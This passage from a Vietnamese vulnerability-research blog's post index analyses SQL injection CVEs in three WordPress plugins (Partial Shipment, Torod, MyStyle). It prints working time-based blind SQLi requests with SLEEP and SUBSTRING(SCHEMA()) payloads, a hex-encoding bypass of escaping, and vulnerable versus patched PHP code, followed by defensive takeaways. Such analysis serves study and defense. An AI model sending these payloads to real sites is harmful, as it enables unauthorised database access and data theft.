nh√¢n\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-48118 trong plugin WordPress Woocommerce Partial Shipment tr∆∞·ªõc phi√™n b·∫£n 3.3, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Woocommerce Partial Shipment Plugin \u0026lt;= 3.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-48118/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48118\"\u003eCVE-2025-48118\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/wc-partial-shipment/advanced/\"\u003eWordPress Woocommerce Partial Shipment Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e:  v3.2(vul) v√† v3.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eWoocommerce Partial Shipment Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48118"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Torod c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.9 Fixed in: \u0026lt;= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Torod: v1.9 Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nVulnerable Sink CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng diff tool ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa code l·ªói v√† code ƒë√£ fix l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nüëâ D·ªØ li·ªáu t·ª´ $_POST['country_id'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nSource: $_POST['country_id'] Sink: $wpdb-\u0026gt;get_results(\u0026quot;SELECT * FROM $table_name WHERE country_id = $country_id\u0026quot;) How it work? L·ªó h·ªïng n·∫±m trong h√†m get_regions_and_cities c·ªßa class ajaxyk thu·ªôc file inc/ajaxyk.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_regions_and_cities trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_regions_and_cities ƒë∆∞·ª£c construct c·ªßa class ajaxyk g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m add_action\nwp_ajax_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_{$action} Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p wp_ajax_nopriv_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_nopriv_{$action} Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated n√™n ta ch·ªâ quan t√¢m t·ªõi hook wp_ajax_nopriv_get_regions_and_cities.\nNh∆∞ v·∫≠y khi g·ª≠i POST request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi tham s·ªë\naction=wp_ajax_nopriv_get_regions_and_cities\u0026amp;country_id=payload_here: Callback get_regions_and_cities ƒë∆∞·ª£c g·ªçi. country_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ country_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-30936 trong plugin WordPress Torod t·ª´ phi√™n b·∫£n 1.9 tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Torod Plugin \u0026lt;= 1.9 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-30936/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTorod\u003c/strong\u003e c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-30936\"\u003eCVE-2025-30936\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/torod/\"\u003eWordPress Torod Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.9\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFixed in\u003c/strong\u003e: \u0026lt;= N/A\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTorod\u003c/strong\u003e: v1.9\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-30936"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging MyStyle Custom Product Designer: v3.21.1(vul) v√† v3.21.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i MyStyle Custom Product Designer Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/entities/class-mystyle-designmanager.php\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $order = \u0026#39; ORDER BY \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order .= ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? \u0026#39; \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39; ASC\u0026#39;; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.1\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ $_GET['orderby'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() v√† wp_unslash() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c lo·∫°i b·ªè k√Ω t·ª± ho·∫∑c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order = ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39;ASC\u0026#39;; // Validate order direction to prevent SQL injection. $allowed_orderby = array( \u0026#39;ms_design_id\u0026#39;, \u0026#39;ms_title\u0026#39;, \u0026#39;ms_access\u0026#39;, \u0026#39;ms_email\u0026#39;, \u0026#39;ms_date_created\u0026#39;, \u0026#39;ms_date_modified\u0026#39;, ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : \u0026#39;ms_design_id\u0026#39;; $order = in_array( strtoupper( $order ), array( \u0026#39;ASC\u0026#39;, \u0026#39;DESC\u0026#39; ), true ) ? $order : \u0026#39;ASC\u0026#39;; $order = \u0026#39; ORDER BY \u0026#39; . $orderby . \u0026#39; \u0026#39; . $order; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng while list $allowed_orderby ƒë·ªÉ quy ƒë·ªãnh r√µ c√°c c·ªôt ƒë∆∞·ª£c ph√©p s·∫Øp x·∫øp. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch h·ª£p l·ªá th√¨ s·∫Ω b·ªã thay th·∫ø b·∫±ng m·∫∑c ƒë·ªãnh 'ms_design_id' =\u0026gt; ch·∫∑n kh·∫£ nƒÉng ch√®n payload ƒë·ªôc l·∫°i.\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_designs c·ªßa class MyStyle_DesignManager thu·ªôc file includes/entities/class-mystyle-designmanager.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_designs trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_designs ƒë∆∞·ª£c g·ªçi trong get_items, init_index_request v√† c√°c h√†m test kh√¥ng ƒë√°ng quan t√¢m\nV√¨ ƒë√¢y l√† l·ªói h·ªïng unauthenticated n√™n c·∫ßn ki·ªÉm tra ch√≠nh x√°c h√†m n√†o kh√¥ng c·∫ßn x√°c th·ª±c ng∆∞·ªùi d√πng.\nget_items() Function get_items n·∫±m trong class MyStyle_Wp_Rest_Api_Design_Controller thu·ªôc file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. get_items ƒë∆∞·ª£c h√†m register_routes trong c√πng class s·ª≠ d·ª•ng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress.\npublic function register_routes() { $version = \u0026#39;2\u0026#39;; $vendor = \u0026#39;wc-mystyle\u0026#39;; $namespace = $vendor . \u0026#39;/v\u0026#39; . $version; $base = \u0026#39;designs\u0026#39;; register_rest_route( $namespace, \u0026#39;/\u0026#39; . $base, array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, // GET \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items_permissions_check\u0026#39; ), \u0026#39;args\u0026#39; =\u0026gt; array(), ) ) ) // other logic } {: file=\u0026ldquo;includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php v3.21.1\u0026rdquo; }\nTuy nhi√™n tr∆∞·ªõc khi callback ƒë∆∞·ª£c g·ªçi, c·∫ßn ph·∫£i check permissions b·∫±ng h√†m get_items_permissions_check, ta c·∫ßn ph·∫£i bi·∫øt anonymoust user c√≥ ƒë∆∞·ª£c g·ªçi api n√†y kh√¥ng. T√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_items_permissions_check.\nüëâ get_items_permissions_check g·ªçi ƒë·∫øn wc_rest_check_manager_permissions ƒë·ªÉ ki·ªÉm tra quy·ªÅn v·ªõi $object = 'settings'. ƒê·ªÉ hi·ªÉu h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o, ta c·∫ßn t√¨m ki·∫øm theo t·ª´ kh√≥a wc_rest_check_manager_permissions trong to√†n b·ªô th∆∞ m·ª•c plugin, b·ªüi v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a tr·ª±c ti·∫øp trong plugin hi·ªán t·∫°i.\nwc_rest_check_manager_permissions ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong plugin WooCommerce settings mapping th√†nh manage_woocommerce G·ªçi current_user_can( 'manage_woocommerce' ) ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user =\u0026gt; Ch·ªâ Admin (ho·∫∑c user c√≥ quy·ªÅn manage_woocommerce). üëâ V√¨ v·∫≠y ta kh√¥ng th·ªÉ khai th√°c t·ª´ h√†m get_items =\u0026gt; khai th√°c h√†m t·ª´ h√†m init_index_request\ninit_index_request() Function init_index_request n·∫±m trong class MyStyle_Design_Profile_Page thu·ªôc file includes/pages/class-mystyle-design-profile-page.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. init_index_request ƒë∆∞·ª£c h√†m init trong c√πng class g·ªçi.\npublic function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Ch·ªâ ho·∫°t ƒë·ªông khi c√°c bi·∫øn trong POST request sau ƒë∆∞·ª£c truy·ªÅn =\u0026gt; kh√¥ng quan t√¢m if( isset( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ) \u0026amp;\u0026amp; wp_verify_nonce( sanitize_key( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ), \u0026#39;mystyle_delete_design_nonce\u0026#39; ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( \u0026#39;administrator\u0026#39; ) || MyStyle_DesignManager::is_user_design_owner( $this-\u0026gt;user-\u0026gt;ID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u0026gt;set_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u0026gt;delete_design_success_message = \u0026#39;Design has been successfully deleted.\u0026#39;; } } } if ( false === $design_id || preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_profile_page-\u0026gt;init_index_request(); } else { $design_profile_page-\u0026gt;init_design_request( $design_id ); } } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nƒê·ªÉ init_index_request ƒë∆∞·ª£c g·ªçi th√¨ c√¢u ƒëi·ªÅu ki·ªán if ph·∫£i x·∫£y ra, ta c·∫ßn ph·∫£i bi·∫øt $design_id l√† g√¨, t√¨m ki·∫øm h√†m get_design_id_from_url trong c√πng class, v√¨ n√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng self v√† g√°n gi√° tr·ªã cho $design_id\npublic static function get_design_id_from_url() { // Try the query vars ( ex: \u0026amp;design_id=10 ). $design_id = get_query_var( \u0026#39;design_id\u0026#39; ); if ( preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /designs/10. -------- // phpcs:ignore $path = 